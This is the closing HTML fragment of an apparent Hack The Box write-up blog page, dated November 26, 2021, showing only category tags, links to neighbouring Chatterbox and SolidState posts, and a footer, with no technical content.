      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-chatterbox/" class="pagination--pager" title="Hack The Box Chatterbox
">Previous</a>
    
    
      <a href="/htb-solidstate/" class="pagination--pager" title="Hack The Box SolidState
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
